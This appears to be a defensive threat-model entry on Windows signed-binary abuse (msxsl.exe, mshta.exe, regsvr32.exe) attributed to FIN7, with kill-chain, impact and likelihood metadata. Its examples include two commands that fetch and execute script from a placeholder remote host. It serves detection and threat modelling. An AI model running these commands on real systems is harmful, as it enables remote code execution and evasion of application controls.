## 👁️ Description

> ### 1. Msxsl.exe
> 
> **Description**: A command-line XSLT processor that can transform XML data using 
> XSL style sheets. Attackers can craft malicious XSL files that execute arbitrary 
> code when processed.
> 
> Example:
> 
> ```
> msxsl.exe input.xml malicious.xsl
> ```
> 
> ### 2. Mshta.exe
> **Description**: Executes Microsoft HTML Applications (HTA files). Threat actors use it 
> to run malicious scripts hosted locally or remotely.
> 
> Example:
> 
> ```
> mshta.exe "http://malicious-server/payload.hta"
> ```
> 
> ### 3. Regsvr32.exe
> **Description**: Registers and unregisters OLE controls like DLLs and ActiveX controls. 
> Threat actors can use it to execute code via scripts.
> 
> Example:
> 
> ```
> regsvr32.exe /s /n /u /i:http://malicious-server/script.sct scrobj.dll
> ```



## 🖥️ Terrain 

 > Threat Actor must have the ability to execute code on a Windows system where the 
> specified utilities Msxsl.exe, Mshta.exe, and Regsvr32.exe are present. 
> This often requires initial access through phishing, exploitation of vulnerabilities, 
> or use of valid credentials.

[FIN7](https://attack.mitre.org/groups/G0046) has primarily targeted the retail, restaurant, hospitality, software, consulting, financial services, medical equipment, cloud services, media, food and beverage, transportation, and utilities industries in the U.S. A portion of [FIN7](https://attack.mitre.org/groups/G0046) was run out of a front company called Combi Security and often used point-of-sale malware for targeting efforts.

## Model Data

#### **⛓️ Cyber Kill Chain**

 > Cyber attacks are typically phased progressions towards strategic objectives. The Unified Kill Chains provides insight into the tactics that hackers employ to attain these objectives. This provides a solid basis to develop (or realign) defensive strategies to raise cyber resilience.

 [`⚡ Execution`](https://www.unifiedkillchain.com/assets/The-Unified-Kill-Chain.pdf) : Techniques that result in execution of attacker-controlled code on a local or remote system.

---

#### **🛰️ Domains**

 > Infrastructure technologies domain of interest to attackers.

 `🏢 Enterprise` : Generic databases, applications, machines and systems that are usually on premises or on Cloud traditional VMs.

---

#### **🎯 Targets**

 > Granular delimited technical entities holding a value to the organization, that are targeted by adversaries. They might be also involved in the detection coverage as the target of log collection. Partially inspired by Veris.

  - [`🛠️ Virtual Machines`](http://veriscommunity.net/enums.html#section-asset) : Placeholder
 - [`🖥️ Workstations`](http://veriscommunity.net/enums.html#section-asset) : Placeholder
 - [`💻 Laptop`](http://veriscommunity.net/enums.html#section-asset) : User Device - Laptop

---

#### **💿 Platforms concerned**

 > Actual technologies used by the organization that will be exploited by adversaries during a successful attack, and eventually of relevance for detection. Are named by commercial designation.

  - ` Windows` : Placeholder
 - ` Active Directory` : Placeholder
 - ` PowerShell` : Placeholder

---

#### **💣 Severity**

 > The severity summarizes the overall danger of incident the vector will provoke, and is to be derived (WIP) from impact, leverage, and difficulty to execute.

 [`⚠️ Significant incident`](https://www.ncsc.gov.uk/news/new-cyber-attack-categorisation-system-improve-uk-response-incidents) : A cyber attack which has a serious impact on a large organisation or on wider / local government, or which poses a considerable risk to central government or (inter)national essential services.

---

#### **🪄 Leverage acquisition**

 > Technical aftermath of the attack from the target perspective, differentiated from impact as it does not consider the value of the consequence, only what increased control the vector execution provides to the adversary.

  - [`💅 Elevation of privilege`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Capacity to augment leverage over the target system by upgrading the compromised access rights
 - [`🐒 Tampering`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Threat action intending to maliciously change or modify persistent data, such as records in a database, and the alteration of data in transit between two computers over an open network, such as the Internet.
 - [`👻 Spoofing`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Threat action aimed at accessing and use of another user’s credentials, such as username and password.

---

#### **💥 Impact**

 > Analysis of the threat vector from the organizational perspective, in non technical term. This aims at putting a clear denomination on what the attacker will actually be able to act upon if the threat vector is realized.

  - [`🔓 Data Breach`](http://veriscommunity.net/enums.html#section-impact) : Non-public information has been accessed from the outside, and successfully extracted.
 - [`🛑 Business disruption`](http://veriscommunity.net/enums.html#section-impact) : Business disruption
 - [`🌍 Reputational Damages`](http://veriscommunity.net/enums.html#section-impact) : Damages to the organization public view may be achieved by using directly the access gained, or indirectly with data gathered.
 - [`⚖️ Legal and regulatory`](http://veriscommunity.net/enums.html#section-impact) : Legal and regulatory costs

---

#### **🎲 Vector Viability**

 > Described with estimative language (likelyhood probability), describes how likely the analyst believes the vector to actually be realized on the organization infrastructure. Estimative language describes quality and credibility of underlying sources, data, and methodologies based Intelligence Community Directive 203 (ICD 203) and JP 2-0, Joint Intelligence.

 [`🧐 Likely`](https://www.dni.gov/files/documents/ICD/ICD%20203%20Analytic%20Standards.pdf) : Probable (probably) - 55-80%
